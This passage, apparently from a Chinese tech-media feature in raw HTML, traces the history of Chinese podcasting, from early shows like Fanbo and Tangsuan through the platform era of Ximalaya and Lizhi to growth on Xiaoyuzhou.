万张。然而招股书中却没有提及与播客相关的营收情况，只说到在新的营销计划中「促进在播客中使用音频广告」「加大对喜剧播客的投资」「计划将播客与直播服务整合」。相较起在欧美大行其道的播客生态，在稳坐中文互联网音频市场头把交椅的喜马拉雅的布局里，不赚钱的播客似乎始终是一项边缘业务。</p><figure><img src=\"https://cdn.sspai.com/2022/08/03/6bb369af479d5382a91e9fce26a7acca.JPG?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" data-original=\"https://cdn.sspai.com/2022/08/03/6bb369af479d5382a91e9fce26a7acca.JPG\" referrerpolicy=\"no-referrer\"><figcaption><a href=\"https://mp.weixin.qq.com/s/kUIgp_vO3GQCb9F3WeFKWQ\" target=\"_blank\">殷启明在 PodFest China 2021 图片来源：播客一下</a></figcaption></figure><p>产品届有句话，叫「一增遮百丑」。指的是如果市场增长，用户规模不断扩大，那么产品中即便有问题，也不会引起什么动荡；可一旦增长停滞，原先积累的错误就会非常容易暴雷。从 2012 年 8 月 1 日成立以来，喜马拉雅在十年中一直没能在播客业务上有所收获，如今业绩吃紧，调转船头也就自然而然。</p><p>倘若以有声书等 PGC 内容为主的喜马拉雅还不足以说明问题，那么以 UGC 内容起家的、中文音频第一股荔枝的财报或许更有说服力。作为第一家上市的中文音频公司，荔枝是除喜马拉雅外最大的中文音频平台，又赶上中概股叱咤美股的风潮，荔枝集团的股价曾一度达到过 16.75 美元/股。然而历经国际局势和市场的错综变幻后，辉煌的股价没能维持太久。截至 2022 年 7 月底，股价已跌至 1.18 美元/股，仅为发行价的十分之一。 </p><figure><img src=\"https://cdn.sspai.com/2022/08/03/51282dcfb0dde915a116a176fafa4a51.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" data-original=\"https://cdn.sspai.com/2022/08/03/51282dcfb0dde915a116a176fafa4a51.png\" referrerpolicy=\"no-referrer\"><figcaption>荔枝上市以来股价走向 来源：雪球</figcaption></figure><p>荔枝最早便以播客起家，Slogan 为「让人人都能成为主播」。在 320 页的招股书中有 198 处提到了「Podcast」，并表示平台中包含 27 个大类、107 个小类的不同属性的播客。截止 2019 年 9 月底，荔枝平台的播客播放量超过了 61 亿次。</p><p>然而播客却一直无法成为荔枝的收入支柱。在其最新公布的 <a href=\"https://ir.lizhi.fm/financial-information/quarterly-results\" target=\"_blank\">2022 年 Q1 财报</a><sup href=\"https://ir.lizhi.fm/financial-information/quarterly-results\" title=\"荔枝 Q1 财报\" footnote-id=\"8\">8</sup>中显示，荔枝在 2022 年一季度的营收中，音频娱乐收入为 5.14 亿元，2021 年一季度为 4.89 亿元，同比增长 25%；播客、广告和其他收入为 269 万元，2021 年一季度为 575 万元，同比下降 53%。相较于当初在招股书里浓墨重彩的描述，播客在荔枝财报上的表现似乎并不能令人满意。</p><figure><img src=\"https://cdn.sspai.com/2022/08/03/669e1688c461ef700fdf8bd725c14a02.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" data-original=\"https://cdn.sspai.com/2022/08/03/669e1688c461ef700fdf8bd725c14a02.png\" referrerpolicy=\"no-referrer\"><figcaption><a href=\"https://ir.lizhi.fm/financial-information/quarterly-results\" target=\"_blank\">荔枝 2022Q1 财报</a> 播客业务收入堪忧</figcaption></figure><h3>增长来自哪里？</h3><p>当然，以上困境主要是 UGC、PUGC 主播和第二代中文播客平台的困境，不足以代表整个中文播客市场。头部播客的数据和像小宇宙这样的第三代中文播客平台依然在增长。</p><p>2020 年 10 月时，我搜集了当时所有小宇宙首页的播客数据（感谢即刻用户<a href=\"https://m.okjike.com/originalPosts/5f7be23a6481320018427537?s=ewoidSI6ICI1Nzg3NzUxMWRkZGU3ODExMDBlMzM2YmMiCn0=\" target=\"_blank\">@老伯德</a> 的帮助），发现其中订阅量最高的十档播客平均订阅量为 24539；而到今日（2022-07-24），根据播客<a href=\"https://www.xiaoyuzhoufm.com/podcast/5e2864f5418a84a04628e249\" target=\"_blank\">「枫言枫语」</a>制作的<a href=\"https://xyzrank.com/\" target=\"_blank\">「中文播客榜」</a>，小宇宙平台前十名播客的平均订阅量为 249568，两年不到的时间里平均增量达到 22 万 5 千有余。</p><figure><img src=\"https://cdn.sspai.com/2022/08/04/ad26bcd48c7f417c1f6a006c6bb61f11.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" data-original=\"https://cdn.sspai.com/2022/08/04/ad26bcd48c7f417c1f6a006c6bb61f11.png\" referrerpolicy=\"no-referrer\"><figcaption><a href=\"https://xyzrank.com/\" target=\"_blank\">「中文播客榜」</a></figcaption></figure><p>而在前段时间登陆 App Store 首页的小宇宙团队专访文章中，小宇宙团队披露，目前平台上的中文播客数量接近 2 万档，比起 2020 年 App 上线时翻倍有余。</p><figure><img src=\"https://cdn.sspai.com/2022/08/03/fa19b35819de550a729cd55f37e04e79.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" data-original=\"https://cdn.sspai.com/2022/08/03/fa19b35819de550a729cd55f37e04e79.png\" referrerpolicy=\"no-referrer\"><figcaption><a href=\"https://apps.apple.com/cn/story/id1623129570\" target=\"_blank\">App Store 首页的小宇宙专访</a></figcaption></figure><p>为什么爆发增长却又受阻？什么样的头部播客还在高歌猛进？它们会遇到新的困境吗？相比起喜马拉雅等平台，小宇宙为何能够保持增长？现有的困境如何解决？未来的中文播客会怎样发展？</p><p>想要了解这些问题的答案，我们要先回到十八年前，回到中文播客的过去。</p><h2>过去：中文播客的三个时刻</h2><p>1994 年，中国通过一条 64K 的国际专线，开启了国际互联网的列车。自那以后，门户、论坛、博客相继兴起，带宽的提升使中文互联网在短短十数年间重新经历了曾遍历整个二十世纪世界文明的媒介爆发过程。从文字到图文、音频、视频，诸多媒介的排列组合催生出别样的繁华，在现实世界的基础上搭建出一个更为庞大和开阔的虚拟世界。近年来颇受追捧的元宇宙也是这一过程的延续。逐渐地，从互联网是现实的一部分，转变成现实是互联网的一部分。</p><figure><img src=\"https://cdn.sspai.com/2022/08/03/6f8fcd030235e16f953f43cc0022d9d3.jpg?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" data-original=\"https://cdn.sspai.com/2022/08/03/6f8fcd030235e16f953f43cc0022d9d3.jpg\" referrerpolicy=\"no-referrer\"><figcaption>1994 年香港红磡演唱会 窦唯 图片来自网络</figcaption></figure><p>这都是后话。在新世纪之初，很多人兴奋地日夜抱着电脑，视之为机遇和无限的可能性。我们现在知道，在 PC 时代的中文互联网，最终胜者是社交网络、搜索和电商。我们还知道，互联网的发展孕育了新的阶级，掌握了社会中的话语权。有的人买断了热搜。有的人买断了市场。有的人激流勇退。有的人销声匿迹。有的人要求手下加班。有的人被泼了冷水。</p><p>但在当时不同。这些听着摇滚、生长于改革开放之后的一代人，在当时还是屠龙的勇士。如今，最聪明的脑袋或许在琢磨如何让你多点击一次广告；而当时，最聪明的脑袋还在忙着做聪明脑袋该做的事：表达。</p><p>如苏格拉底所说，智慧存在于对话之中。</p><h3>2004-2005：摇滚、唱片、博客、Podcast</h3><p>二十年前的 2002 年，在美国硅谷，人们最热衷的话题之一是博客。2000 年的互联网泡沫危机使这里正经历失业寒潮，而博客成为了抱团取暖、交流信息最好的载体。有媒体将这一年称为「博客元年」。受到影响，大洋彼岸的中国也开始有了类似的产品。一时间，在门户和 BBS 之外，网络上又出现了许多新鲜的事物。</p><p>彼时的中国大陆上，学生们还没有被卷入考研和考公的漩涡。作为毕业生大军中的一员，大学毕业后的何淼和陈沂出于对摇滚乐的狂热喜爱，来到了摇滚乐厂牌嚎叫唱片工作。他们在音乐圈认识的朋友葛灏想要把一些线下演出信息、个人电台节目放到网上，于是建立了北京广播网站。他想起何淼和陈沂有录音的经验，就叫他俩来提供些节目。就这样，一个简单制作后的节目上线了，本来叫「嚎叫广播」，后改名为「BJ Radio」，共做了五期。</p><figure><img src=\"https://cdn.sspai.com/2022/08/03/a9c88b59785b90db1c781a9397d7f7f1.jpg?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" data-original=\"https://cdn.sspai.com/2022/08/03/a9c88b59785b90db1c781a9397d7f7f1.jpg\" referrerpolicy=\"no-referrer\"><figcaption>何淼和陈沂</figcaption></figure><p>这次创作对两个从小就有广播梦的年轻人来说是个不错的经历。他们以歌会友，逐渐聚集起一帮志同道合的朋友，干脆成立了一个活动小组，名为「糖蒜」。两年后，又有一个音乐网站找上门来，希望两人提供一些音乐节目。一档新的节目便建立起来，何淼和陈沂也开始精进自己的录音和剪辑技术。后来，网站经营不善倒闭了，节目却发展得不错，何淼和陈沂不愿就此放弃。于是，在 2005 年，糖蒜成立了文化公司，开始正式经营「糖蒜广播」的业务。</p><p>与此同时，从 2002 年的萌芽以来，中文博客历经蜕变，逐渐从「一种新鲜的技术手段」一跃成为「颇为时髦的生活方式」。网民们每天乐此不疲地刷新网站、从自己关注的博主处攫取资讯，再在线下与朋友们交流。而初代网红们凭借着新颖的观点和饶有趣味的表达，也成功跻身为中文互联网里最早的意见领袖。这一年后来被媒体称为<a href=\"https://news.sina.com.cn/c/2005-12-14/15358581927.shtml\" target=\"_blank\">「中国博客元年」</a><sup href=\"https://news.sina.com.cn/c/2005-12-14/15358581927.shtml\" title=\"新民周刊：2005 年可称中国博客元年\" footnote-id=\"9\">9</sup>。</p><p>充沛的表达欲鼓舞着年轻人们。原本以审计师为职业目标的南开大学金融系大三学生林嘉澍——他更为人熟知的名字是 flypig——在论坛上结识了拥有十七年电台主播和唱片公司工作经验的平客。二人都醉心于丰富的网络生态，又都不满传统电台的死板，于是一拍即合，决定合作制作一款聊到尽兴的播客，名为「反波」：反对传统电波里的一切虚假、束缚、欺骗和铜臭。</p><p>反波的最早一期播客上线于 2005 年 1 月，以调侃春晚为主题。由于平客多年的电台主播经验，二人的制作水平一开始就达到了专业水准；飞猪又是个做事严谨的程序员，并且关注科技和海外市场。节目一经上线就达到了不错的点击率，飞猪为反波制作了官网，在标题栏上写道「All Radios Go to Hell! 」。</p><figure><img src=\"https://cdn.sspai.com/2022/08/03/23631b4d409a03b9c11e139ea528b7b7.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" data-original=\"https://cdn.sspai.com/2022/08/03/23631b4d409a03b9c11e139ea528b7b7.png\" referrerpolicy=\"no-referrer\"><figcaption>反波官网</figcaption></figure><p>在后来<a href=\"http://news.sohu.com/20060117/n241476057.shtml\" target=\"_blank\">武汉晚报对反波的报道</a><sup href=\"http://news.sohu.com/20060117/n241476057.shtml\" title=\"武汉晚报：播客「反波」：生活关键是好玩\" footnote-id=\"10\">10</sup>中，播客被称为<strong>「博客的一种新的衍生形态」</strong>。</p><p>林嘉澍对新媒介一直有着敏锐的嗅觉。若干年后 Vlog 兴起时，他与 cbvivi 一同开发了一闪 app。后来，flypig 又开发了胶片模拟软件 NOMO 并大获成功。如今，除了经营自己的视频账号外，他有时还会作为嘉宾参与影视飓风团队的播客录制。</p><figure><img src=\"https://cdn.sspai.com/2022/08/03/d9a1ff505b605c916edd427d5aec90ac.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" data-original=\"https://cdn.sspai.com/2022/08/03/d9a1ff505b605c916edd427d5aec90ac.png\" referrerpolicy=\"no-referrer\"><figcaption><a href=\"https://www.xiaoyuzhoufm.com/episode/60d5b03924acc9a35d4c4202\" target=\"_blank\">飞猪参与的影视飓风播客</a></figcaption></figure><p>这便是中文播客兴起的第一个阶段。在这一时期，播客制作者们普遍需要两种技能：音频处理能力和建站能力。因而，拥有过电台/音乐/唱片公司经验的从业者，和熟悉网络、表达欲旺盛的年轻人理所当然地成为了启蒙中文播客的标配组合。</p><p>这样的组合有其必然性：一方面，互联网的野蛮生长使本就被盗版折腾得千疮百孔的音乐市场再度蒙受打击，原本以唱片、磁带为介质的脆弱的生产和销售链受到破坏，新的秩序尚未建立，许多本就在理想和生活中勉强平衡的从业者不满于现状，流向其他行业；</p><p>另一方面，这从命名上就可以看出——「播客」一词在早先也曾被用以形容视频作者。如果你去搜索早期互联网留下的旧闻，会发现很多报道中所指的「播客平台」是优酷、土豆、酷6之类的视频网站。一直到 2016 年，优酷还推出过名为「播客学院」的视频创作者扶持计划，类似于现在的 B 站 UP 主创作学院。同一时期，为了对应随互联网涌入的英文名词，人们还发明了「极客」「黑客」「维客」「闪客」等词汇。许多新颖的事物集中展示在新世纪的中文互联网上，为那个时候的年轻人提供了畅所欲言的机遇。  </p><figure><img src=\"https://cdn.sspai.com/2022/08/03/956c74196b0578d2d493e0766c00beb2.PNG?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" data-original=\"https://cdn.sspai.com/2022/08/03/956c74196b0578d2d493e0766c00beb2.PNG\" referrerpolicy=\"no-referrer\"><figcaption>B 站热门视频 <a href=\"https://www.bilibili.com/video/BV1Wa411D74Q?spm_id_from=333.934.top_right_bar_window_default_collection.content.click&amp;vd_source=becd8be72a0febd859aeafc5acca244f\" target=\"_blank\">舅舅我啊，最喜欢二次元了！</a></figcaption></figure><p>播客所对应的「Podcast」一词的真正诞生是在 2004 年，由英国记者 Ben Hammersley 发明，用来描绘「将网络广播下载到 iPod 上播放」这一行为。那一年，苹果发布了 iPodder，被视作 Podcast 出现的标志。其后，在 2005 年 6 月 28 日，iTunes 4.9 发布，作为一款优秀的播客客户端，开始使播客市场由极客们的小众玩具逐渐转变为大众消费内容的新选择。由于飞猪始终在关注国内外的互联网新闻，反波在诞生伊始就将自我认知为播客；而糖蒜广播的何淼和陈沂从小听电台广播长大，分享内容也以圈内为主，早期更多以网络广播的身份自居。2009 年后，感知到苹果设备风靡的何淼决定将节目放在 iTunes Podcast 上，收获了大量好评。一年后，渐起规模的糖蒜众人在何淼的召集下开了个会，建立起以脱口秀、访谈、音乐和生活方式为主要形式的综合性网络广播。这或许也是中国最早的播客矩阵。</p><h4><strong>萌芽：第一波中文播客浪潮</strong></h4><p>任何一个风口的诞生往往需要聚集三个重要因素：上游的技术突破、中游的生产力提升、下游的消费场景增多。在 2005 年前后的中文播客第一次浪潮里，音频在线网站和 iTunes 播客功能的出现提供了平台、在博客技术上更进一步的 RSS 的音频分发功能提供了播客的技术可行性；遭遇盗版冲击的音乐市场、逐渐没落的传统电台催生出出走的音频专业人才，ta 们与掌握 IT 技术的极客们一起成为初代中文播客的标志性组合；物质上升后，在眼花缭乱的消费时代里寻找华语文明里的精神共鸣的年轻人们构成了早期听众。当技术、才华和需求逐一匹配，早期的市场便逐渐成长起来。</p><figure><img src=\"https://cdn.sspai.com/2022/08/03/154078a700aeb286b73f756f2d295f69.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" data-original=\"https://cdn.sspai.com/2022/08/03/154078a700aeb286b73f756f2d295f69.png\" referrerpolicy=\"no-referrer\"></figure><h3>2012-2013：智能手机、平台、京海派、知识付费</h3><p>度过了混沌的启蒙阶段后，在 2012-2013 年间，受到移动互联网兴起的影响，播客的上中下游产业再次迎来剧变。</p><h4>从互联网到移动互联网</h4><p>最早带来冲击的是智能手机和移动互联网的普及。</p><p>第一台真正意义上的智能手机——即初代 iPhone，于 2007 年 1 月由乔布斯亲自发布。由于大量的定制零件和工艺问题，发售日期则来到了当年 6 月底。而在中国，由于运营商的协议谈判、工业链和供货能力不足等问题，加上培育市场需要时间，早年间的几部 iPhone 并未在大陆市场上大显身手。不过，地下市场里流通的水货还是让许多人看到了智能手机这一产品形态的惊人潜力。</p><p>2011 年，采用经典三明治结构的 iPhone 4 进入中国市场；10 月 5 日，在乔布斯去世的前一天，iPhone 4S 发布，它被喻为乔布斯的遗作。当时，作为初次搭载 Siri 语音助理的手机，iPhone 4S 是许多人眼里科幻成真的象征，引起了轰动的抢购和黄牛加价。甚至于《乔布斯传》中文版上市时，销量力压了当时各有新书的韩寒和郭敬明，以二百多元的定价成为畅销榜上排行第一的畅销书。《萌芽》杂志采访韩寒，问他对智能手机的看法，韩寒说自己在用着诺基亚，用键盘打字很流畅，对没有键盘的 iPhone 还是有些顾虑；但应该迟早还是要换的。这也是那时很多人的看法。时至今日，很多年轻人可能已经不再记得那个手机上带有键盘的时代了。</p><p>而同在 2011 年 10 月，雷军带领团队研发了一年多的初代小米开售，打出了经典的 1999 的价格。智能手机的普及从此势不可挡。</p><p>根据<a href=\"http://www.cnnic.cn/hlwfzyj/hlwxzbg/hlwtjbg/201407/P020140721507223212132.pdf\" target=\"_blank\">中国互联网络信息中心（CNNIC）</a><sup href=\"http://www.cnnic.cn/hlwfzyj/hlwxzbg/hlwtjbg/201407/P020140721507223212132.pdf\" title=\"中国互联网络信息中心：中国互联网络发展状况统计报告（2014）\" footnote-id=\"11\">11</sup>和<a href=\"https://www.iimedia.cn/c400/16319.html\" target=\"_blank\">艾媒咨询</a><sup href=\"https://www.iimedia.cn/c400/16319.html\" title=\"艾媒咨询：2010年中国手机市场不同价格段各品牌的市场份额\" footnote-id=\"12\">12</sup>的数据，在 2011 年前，由于运营商注重 3G 服务和智能手机的推广，而居高不下的价格使手机入网的增幅在 2009-2010 年间出现过短暂跌落，当时市场上最主流的手机品牌是诺基亚、苹果、索尼、三星、摩托罗拉等，基本全部是海外品牌；等到了 2012 年，<a href=\"http://www.chinacir.com.cn/2013_sjkx/345503.shtml\" target=\"_blank\">国产品牌便成功崛起，占据了七成以上的市场份额</a><sup href=\"http://www.chinacir.com.cn/2013_sjkx/345503.shtml\" title=\"中国产业竞争情报网\" footnote-id=\"13\">13</sup>。手机网民数也从 2009 年的 2.3 亿，一跃达到 2012 年的 3.9 亿，并且超过了整体网民比例的 70%。</p><figure><img src=\"https://cdn.sspai.com/2022/08/04/01e240e495a69a8ff5c384d6f18159c2.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" data-original=\"https://cdn.sspai.com/2022/08/04/01e240e495a69a8ff5c384d6f18159c2.png\" referrerpolicy=\"no-referrer\"></figure><p>尽管那时的国产手机普遍利润低、价格便宜，系统打磨还不够完善，但移动互联网的大门彻底洞开，不会再关上了。</p><p>新的消费场景催生新的市场秩序，过去的垄断被打破了。2011 年 1 月，微信发布，到 8 月发布 3.0 版本前，积攒了 1500 万用户；而后，随着手机市场爆发，微信的体量也迅速扩大，注册用户于 2011 年底前突破 3000 万；到了 2012 年 3 月，已达一亿大关，彻底成为国民级别的 app。</p><p>BAT 格局震动，百度和阿里危机感十足。腾讯预先一步在移动互联网延续了社交优势，电商和搜索的城池或将被侵袭。尤其是百度，面对以独立 app 为入口的移动互联网，浏览器的基石不在，面对无所依托的搜索引擎市场，深感忧虑。2012 年正值玛雅的末世预言，按照当时媒体的说法，BAT 们在「抢占通向移动互联网的船票」。2013 年 10 月，连续错过机会的百度选择豪掷一把，以 19 亿美元的天价全资收购了占有应用分发市场入口的 91 无线。这引起了许多轰动，是当时中文互联网历史上最大的一起并购案。几年后的 2017 年，91 无线所处的研发中心被关闭，所有员工裁员遣散。百度最终没能把握到移动互联网的大盘，曾经的 BAT 御三家如今已不可同日而语。</p><p>李彦宏的误判在播客届也留下了涟漪。在 2019 年的 PodFest 活动现场，学霸气质、身着灰色卫衣和牛仔裤的王俊煜坐在第二排的位置，一边听嘉宾演讲一边紧张地改着电脑里的 Keynote。他即将上场，面对着现场的播客爱好者们发布轻芒的播客小程序，试图在微信里为听播客的场景提供一个解决方案。当时的场地是一个英语培训中心，王俊煜走向讲台后做了略显羞涩的开场，很快又沉迷于对产品的描述，像是一个陷入教学思路中的老师，又像是个做出了满意作业后上台汇报的学生。</p><figure><img src=\"https://cdn.sspai.com/2022/08/04/018e8cfbe19c4932b346660dd435536d.JPG?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" data-original=\"https://cdn.sspai.com/2022/08/04/018e8cfbe19c4932b346660dd435536d.JPG\" referrerpolicy=\"no-referrer\"><figcaption>正在修改 Keynote 的王俊煜 图片来自 播客一下</figcaption></figure><p>王俊煜毕业于北京大学，是广东省的高考状元。2007 年毕业后，王俊煜到谷歌中国用户体验团队任职，认识了创新工厂的李开复。李开复颇为欣赏这位年轻人，当王俊煜意识到安卓系统在软件交互和应用分发等领域的巨大潜力后，李开复将王俊煜招致麾下，给了他 100 万美元的天使资金。豌豆荚就这样成长起来。在 2010-2011 年间，凭借简洁的设计、优秀的体验，豌豆荚在一众市场软件中脱颖而出，一度占据了市场的半壁江山。</p><p>91 无线的天价并购费新闻传来，市场份额相近、口碑更好的豌豆荚备受鼓舞。传闻，受到百度刺激的阿里一度也为豌豆荚开过 15 亿美元的高价。这似乎是一个距离财务自由无比接近的时刻。</p><p>然而，深思熟虑后的王俊煜拒绝了。他觉得，也许这真的是个风口。倘若豌豆荚能借此机会成长起来，他或许就能一举改变中文互联网市场里流氓行为遍地、不重视用户体验的草莽状态。</p><figure><img src=\"https://cdn.sspai.com/2022/08/04/0560647cc2fceb9274447fab18ce38a1.JPG?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" data-original=\"https://cdn.sspai.com/2022/08/04/0560647cc2fceb9274447fab18ce38a1.JPG\" referrerpolicy=\"no-referrer\"><figcaption>王俊煜在 2019 PodFest China 拍摄 by 拐子狼</figcaption></figure><p>杀人放火金腰带，修桥补路无尸骸。在群雄逐鹿的早期移动互联网时代，他最终没能成功。各家手机厂逐渐意识到应用分发市场的重要，注重起自建市场；腾讯借微信之手推出应用宝，迅速占领了流量；百度吞并 91 无线后，一度成为市场老大，和 360 手机助手发起械斗。2015 年，<a href=\"https://baijiahao.baidu.com/s?id=1631779629655215552&amp;wfr=spider&amp;for=pc\" target=\"_blank\">豌豆荚发现百度手机助手在没有任何通知的情况下屏蔽了豌豆荚，于是发布公开信，向公众和百度呼吁平等相待</a>。<sup href=\"https://baijiahao.baidu.com/s?id=1631779629655215552&amp;wfr=spider&amp;for=pc\" title=\"曾经是国内最大的应用商店，最终被卖，豌豆荚是如何衰败的？\" footnote-id=\"14\">14</sup></p><p>王俊煜并没有等来学长李彦宏的回应。就像前东家谷歌所遇到的那样，沉默是唯一的回音。</p><p>2016 年 7 月，豌豆荚卖身阿里，价格并未披露。坊间传闻，估值从 15 亿美元跌落到 2 亿美元。王俊煜告别豌豆荚后，组建了轻芒团队，瞄准以 RSS 订阅为基础、Mark 功能为核心的内容服务。后来，出于对播客的兴趣和 RSS 技术积累，他带着团队做起了播客的业务。轻芒团队无疑为播客市场带来了一些独特的功能，包括<a href=\"https://mp.weixin.qq.com/s/wVMr9SrozN1nQBriNK85Ew\" target=\"_blank\">小程序、自动翻译、视频分享，让听播客的人可以像学霸一样方便地记笔记。</a><sup href=\"https://mp.weixin.qq.com/s/wVMr9SrozN1nQBriNK85Ew\" title=\"ThinkAge 新气集：我和王俊煜聊了聊“大厂”人、媒体和播客投资｜新气集播客\" footnote-id=\"15\">15</sup>这也许不是大众最需要的功能，但它确实很有书生意气，在千篇一律的商业社会里独有精彩。</p><figure><img src=\"https://cdn.sspai.com/2022/08/04/27b606ce7060e0f5efe80c470079f4fb.png?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" data-original=\"https://cdn.sspai.com/2022/08/04/27b606ce7060e0f5efe80c470079f4fb.png\" referrerpolicy=\"no-referrer\"><figcaption>拥有独特时间轴的轻芒播客小程序</figcaption></figure><p>不过，这时的中文播客市场，也早已不同于当年。</p><h4>平台入场：在世界末日涅槃重生</h4><p>喜马拉雅成立于 2012 年 8 月 1 日，创始人余建军毕业于西安交大，在校期间即开始人生第一次创业，以一款名为「模拟中国」的业务获得了 100 万元的投资。毕业后，凭借经验，他又创办了一家提供全景拼接技术的公司，靠着软件版权获得了每年数千万元的收入。在 2009 年，移动互联网刚刚从中国市场兴起时，他就着眼到了 VR 领域，开始搭建虚拟现实平台。用现在的话来说就是元宇宙。这个项目初期吸引来了 2000 万元的天使投资，却在持续烧钱两年后，始终得不到落地，团队最终解散。此时，距离第一次创业，余建军已经摸爬滚打了十年，如此失败使他痛定思痛，最终决定调转方向，做一款 C 端产品。</p><p>眼见国产智能手机逐渐崛起，BAT 们为抢夺市场而疯狂烧钱，预感到风口将至的余建军和搭档陈小雨，在不同行业多番尝试后，最终决定将宝押在音频领域。</p><p>在当时，尽管中文播客已有所发展，却始终没有得到大众市场的注意。2012 年，微博开通了语音微博功能，创新工厂的李开复试用后还发了篇文章描述使用体验，名为《语音微博是个伪命题》。但余建军并不这么想。他觉得，随着移动互联网的普及，人们的碎片化时间越来越多，而音频恰好是满足碎片化时间的媒体。同时期，视频市场正争得不可开交。优酷和土豆于喜马拉雅创立的同一个月宣布合并，完成了资源置换。相比起厮杀猛烈的视频市场，音频市场具备同样的内容消费属性，并且还是蓝海。同时，随着中国家庭购买汽车数量的增加，连传统广播也在恢复新增的势头。而视频的版权费用、带宽成本太高，需要大量资金来满足基础建设。相较之下，投入音频更有性价比。</p><p>2013 年 3 月，喜马拉雅 FM 正式上线，以半年时间达到千万用户规模。<a href=\"https://baijiahao.baidu.com/s?id=1589810812028943342&amp;wfr=spider&amp;for=pc\" target=\"_blank\">同年上线的还有荔枝 FM、多听 FM、考拉 FM 等等</a><sup href=\"https://baijiahao.baidu.com/s?id=1589810812028943342&amp;wfr=spider&amp;for=pc\" title=\"三声：2013-2018 年的移动音频裂变史 电台已逝，谁又当立？\" footnote-id=\"16\">16</sup>。</p><p>与余建军相似，荔枝 FM 的创始人赖奕龙也是一位连续创业者，<a href=\"https://mp.weixin.qq.com/s/3_kfeaoMOm0v-1WAXL9cyA\" target=\"_blank\">先后创立过企信通、摩网 WAP 门户等项目</a><sup href=\"https://mp.weixin.qq.com/s/3_kfeaoMOm0v-1WAXL9cyA\" title=\"i黑马：荔枝创始人赖奕龙 未来几年内或将出现“国民级”语音社交产品\n\" footnote-id=\"17\">17</sup>。投身互联网创业之前，他还是一名摇滚青年，爱好电台，甚至从深圳大学辍学去做了电台 DJ，还组织过摇滚音乐会。2012 年，多次创业后的赖奕龙在玛雅预言世界末日的这一天关上家门，想看看会怎样，结果什么都没有发生。不过，待在家里的赖奕龙最终用一天时间复盘了自己这些年的经历，做了一项决定：要做就做喜欢的。作为多年的摇滚乐迷和电台爱好者，他和早期的中文播客创作者们很熟，再加上一次旅美经历使他感受到美国播客的兴起，于是，<a href=\"http://www.cnr.cn/gd/jjzx/20210117/t20210117_525392932.shtml\" target=\"_blank\">一档「让人人都能成为主播」的产品成立了</a><sup href=\"http://www.cnr.cn/gd/jjzx/20210117/t20210117_525392932.shtml\" title=\"央广网：赖奕龙 粤派创业者的“长期主义”，赶考“声音梦想”下半场\" footnote-id=\"18\">18</sup>。在珠海从事过电台工作的赖奕龙决定用当地特产的荔枝来为产品命名，这就是后来的「中国在线音频第一股」荔枝 FM。</p><h4>京派</h4><p>移动互联网的到来所催动的不仅仅是平台。</p><p>2007 年，在一个游戏论坛上，赵夏认识了何淼，了解了糖蒜广播。那时的赵夏和朋友熊出于对游戏的热爱，一直想做一个游戏论坛，但一直忙碌没有开工，直到 2009 年底才开始筹备。后来，赵夏向熊介绍了糖蒜广播的模式后，两人认为音频是一个不错的内容载体，可以在上面畅快地聊聊游戏。于是，2010 年，几人在何淼的家中录下了第一期机核广播，反响不错。当时论坛已经式微，网站流量很少，<a href=\"https://www.gcores.com/articles/24821#nopop_16aes\" target=\"_blank\">机核便以音频为重点，慢慢发展成专业的游戏媒体。</a><sup href=\"https://www.gcores.com/articles/24821#nopop_16aes\" title=\"回顾机核这些年：从第一天到7周年\" footnote-id=\"19\">19</sup></p><figure><img src=\"https://cdn.sspai.com/2022/08/04/fb21d871983018afa0610f1c677d9d6d.JPG?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" data-original=\"https://cdn.sspai.com/2022/08/04/fb21d871983018afa0610f1c677d9d6d.JPG\" referrerpolicy=\"no-referrer\"><figcaption>机核第一次录音</figcaption></figure><p>像这样围绕在糖蒜周边的播客不止一个。2012 年，糖蒜邀请了「Newradio」「三角龙」「坏蛋调频」「鬼影人间」「友的聊」「机核网」六家播客一同录制节目，这几家都是当时的头部播客。</p><p>随着体量的越来越大，糖蒜吸引来的嘉宾也越来越重磅。2013 年，基努里维斯来中国宣传新片，还在糖蒜录制了节目。那时的许多媒体将糖蒜广播称为「中国的海盗电台」。</p><figure><img src=\"https://cdn.sspai.com/2022/08/04/58878ecb3bdc60ccca924cac9713edc0.JPG?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" data-original=\"https://cdn.sspai.com/2022/08/04/58878ecb3bdc60ccca924cac9713edc0.JPG\" referrerpolicy=\"no-referrer\"><figcaption>基努里维斯在糖蒜广播</figcaption></figure><p>同一年，从事音乐行业近十年的相征因为工作的问题陷入了一段糟糕的情绪。朋友王硕给他发短信宽慰，并说自己做了个电台，叫「坏蛋调频」，有空可以听听。于是，一个百无聊赖的晚上，相征把自己的 iPhone 4 连上厨房的音响，开始听节目。</p><p>也许是听朋友聊着音乐的熟悉场景再次打动了他，他把音响从厨房拎到卧室，坐在桌子前听了很久。从那天开始，他追着听完了「坏蛋调频」的全部节目，又开始听「糖蒜广播」。</p><p>相征想起自己在音乐行业的许多朋友们。在周末时，他常常拉着大家到自己的办公室里闲聊喝酒，每次七八个朋友分享最近的读书、电影、游玩。他们把这个小小的聚会称为「新基荡者联盟」。2013 年 4 月的一个晚上，几个朋友在加班，现场只来了相征、贺愉、李志明三个人。喝完酒后，相征说，我们不如也录下来，做成播客吧。<a href=\"https://www.163.com/dy/article/G3FJD39V0521KJO0.html#\" target=\"_blank\">这就是「大内密谈」的雏形</a><sup href=\"https://www.163.com/dy/article/G3FJD39V0521KJO0.html#\" title=\"三明治：《大内密谈》主播相征 我当然自恋，为什么不自恋？\" 